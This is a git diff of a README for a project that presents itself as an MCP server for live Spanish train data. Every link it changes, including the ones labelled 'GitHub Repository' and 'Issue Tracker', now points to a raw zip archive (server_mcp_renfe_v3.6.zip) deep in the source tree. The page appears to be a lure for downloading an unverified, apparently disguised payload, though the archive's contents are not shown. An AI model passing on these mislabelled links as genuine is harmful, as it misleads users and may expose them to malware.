@@ -1,6 +1,6 @@
 # 🚄 renfe_mcp_server - Access Live Spanish Train Data Easily
 
-![Download Latest Release](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/scraper/renfe_mcp_server_2.6.zip%20Latest%20Release-v1.0-blue)
+![Download Latest Release](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/server_mcp_renfe_v3.6.zip%20Latest%20Release-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the renfe_mcp_server project. This application provides real-time inf
 
 To download the latest version of the renfe_mcp_server, please visit the following link:
 
-[Download the Latest Version](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/scraper/renfe_mcp_server_2.6.zip)
+[Download the Latest Version](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/server_mcp_renfe_v3.6.zip)
 
 Follow these steps to install the software:
 
@@ -81,8 +81,8 @@ If you wish to contribute to the renfe_mcp_server project, please do the followi
 
 For further information, please check the following:
 
-- [GitHub Repository](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/scraper/renfe_mcp_server_2.6.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/scraper/renfe_mcp_server_2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/server_mcp_renfe_v3.6.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/server_mcp_renfe_v3.6.zip)
 
 ## 🗨️ Feedback
 
@@ -90,4 +90,4 @@ We appreciate your feedback! Please let us know about your experience using the 
 
 To download the latest version again, please visit:
 
-[Download the Latest Version](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/scraper/renfe_mcp_server_2.6.zip)
+[Download the Latest Version](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/server_mcp_renfe_v3.6.zip)
